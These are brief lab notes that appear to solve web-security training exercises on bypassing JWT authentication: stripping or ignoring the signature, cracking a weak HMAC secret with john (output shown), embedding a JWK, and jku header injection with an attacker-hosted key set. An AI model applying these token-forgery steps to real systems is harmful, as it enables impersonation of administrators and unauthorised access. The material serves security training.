# Lab: JWT authentication bypass via unverified signature

Try to change without changing the signature

Remove the signature and change the payload value


# Lab: JWT authentication bypass via weak signing key

```bash
┌──(root💀lulz-ExtraFold)-[~]
└─# john --wordlist=jwt.secrets.list jwt.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret1          (?)
1g 0:00:00:00 DONE (2024-12-31 06:46) 10.00g/s 944181p/s 944181c/s 944181C/s ..!@2222222fasdhiohDCWQA
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# Lab: JWT authentication bypass via jwk header injection

Use JWT Editor Burp Extension to generate and embedded JWK into the original JWT token
First go to JWT Editor to generate a new RSA key.
Change the payload sub to `administrator` and then Attack -> Embedded JWK
Then send.

# Lab: JWT authentication bypass via jku header injection

```plaintext
Solution:

Change the header into something like this:
{  
    "kid": "ef31f9fc-1fe0-45de-8e34-7074897a728e",  
    "alg": "RS256",  
    "jku": "https://exploit-0a400099037332758298dcf001f900f7.exploit-server.net/exploit"  
}
Note: Change the kid to the same with kid generated from JWT Editor.

Exploit server BODY:
{
    "keys": [
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "ef31f9fc-1fe0-45de-8e34-7074897a728e",
    "n": "s_OJAa4KGJz8m1kjV5dAVvAC0Yg4qSNCnc0wWTHJSJK8u1j3i50fIe1Iqn9DKMkJNlODMs0YRQpiy38El_k0XosBV-oFEtV4OtV9PykJQogWqq-lzuPG-wnIGeNBItSwrOYecogeEw5TeGuFW3RILey7G6a9RQQqcvLnfXXiJ7BkUpBVnYBLlIKHAVfoO_PexuVEbmG518wXK5U8n6OlZ7weuxyS0UiWATUQxVjvdY2o6dq4H5NRFHCDo7XMssTWm8ABVlzE84_uzCwB6bO5cIu2F22ZY6oNJoZk5cDX6_B_HrCwO4_DcyIGsixWSD5cIwiVCa7c3X-me3iQsCXB3w"
}
    ]
}
With the keys copy from JWT Editor Extension -> Copy Public key as JWK

Sign the new JWT (With options: Dont't modify the header)

SEND
```
